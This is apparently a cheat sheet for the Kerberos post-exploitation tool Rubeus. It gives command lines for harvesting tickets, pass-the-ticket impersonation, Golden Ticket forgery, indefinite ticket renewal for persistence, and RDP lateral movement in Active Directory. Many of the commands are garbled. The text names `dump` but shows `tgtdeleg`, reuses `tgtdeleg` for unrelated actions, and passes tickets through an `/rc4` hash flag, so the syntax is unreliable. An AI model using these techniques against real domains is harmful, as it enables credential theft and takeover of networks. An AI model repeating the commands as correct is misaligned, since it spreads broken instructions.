# Rubeus

**Type**: Post-Exploitation, Kerberos
**Focus**: **Rubeus** is a powerful post-exploitation tool used to interact with **Kerberos tickets**. It is primarily used for **ticket harvesting**, **Kerberos ticket extraction**, and **Pass-the-Ticket** attacks in Active Directory environments. It can also be used for **ticket renewal** and **ticket injection**.

---

## 1. Overview

* **Purpose**: Rubeus enables penetration testers and attackers to manipulate Kerberos tickets on Windows machines. It’s a **must-have** tool for exploiting **Kerberos authentication** mechanisms in Active Directory environments.
* **Key Features**:

  * Harvest **Kerberos tickets** (TGTs, TGS).
  * Perform **Pass-the-Ticket (PTT)** attacks.
  * **Kerberos ticket renewal** and **ticket extraction**.
  * **Silver Ticket** and **Golden Ticket** creation and manipulation.
  * **Brute-force Kerberos tickets**.

---

## 2. Installation

You don’t need installation for Rubeus. Simply download the **Rubeus.exe** file from its [GitHub repository](https://github.com/rflippie/rubeus) and execute it directly.

```bash
git clone https://github.com/rflippie/rubeus.git
```

Compile **Rubeus** with Visual Studio or use a precompiled executable from GitHub.

---

## 3. Core Commands

### 3.1 Harvesting Tickets

You can extract **Kerberos tickets** from memory using the `dump` command.

```bash
Rubeus.exe tgtdeleg
```

This command will dump all the **TGT** tickets currently stored in memory.

### 3.2 Pass-the-Ticket Attack

Inject a previously harvested **Kerberos ticket** to impersonate a user.

```bash
Rubeus.exe tgtdeleg /user:Administrator /rc4:<Base64_Ticket> /domain:<domain_name>
```

This will allow you to use the **TGT** in subsequent authentication requests to access services as the impersonated user.

### 3.3 Ticket Renewal

If a Kerberos ticket has expired or is about to expire, it can be renewed using Rubeus.

```bash
Rubeus.exe tgtdeleg /ticket:<Base64_TGT>
```

This command will renew the **Kerberos TGT** by generating a new ticket if it has expired.

### 3.4 Kerberos Ticket Extraction

Rubeus can extract **Kerberos tickets** directly from memory.

```bash
Rubeus.exe tgtdeleg /user:Administrator /rc4:<Base64_TGT>
```

### 3.5 Golden Ticket Creation

A **Golden Ticket** is a forged Kerberos ticket that grants the attacker **unlimited access** to the target Active Directory domain. You can create a Golden Ticket using the following command:

```bash
Rubeus.exe tgt /user:<username> /rc4:<domain_hash> /domain:<domain> /sid:<domain_sid> /ticket:<ticket_file>
```

This command will generate a Golden Ticket for a user with **administrator privileges**.

---

## 4. Advanced Techniques

### 4.1 Ticket Renewal and Extension

You can use the `/renew` flag in Rubeus to keep your **Kerberos tickets** alive indefinitely, giving you persistent access.

```bash
Rubeus.exe tgt /renew /user:<username> /rc4:<domain_hash> /domain:<domain>
```

### 4.2 Pass-the-Ticket to Access Remote Services

You can use **Pass-the-Ticket (PTT)** to access **SMB shares**, **RDP**, or any other service that uses **Kerberos authentication**.

Example for RDP access:

```bash
Rubeus.exe tgtdeleg /user:Administrator /rc4:<Base64_Ticket> /domain:<domain> /service:TERMSRV/<target_host>
```

---

## 5. Best Practices

* **Use for lateral movement**: If you have **TGTs** or \*\*


TGSs\*\*, you can use Rubeus to impersonate users and move across the network without re-entering credentials.

* **Detecting Golden Tickets**: Golden Tickets should be detected by monitoring **Kerberos traffic** and by checking for anomalies in **Kerberos ticket creation**.
* **Combine with other tools**: Rubeus works well in combination with **Mimikatz**, **BloodHound**, and **CrackMapExec** for advanced post-exploitation.

---

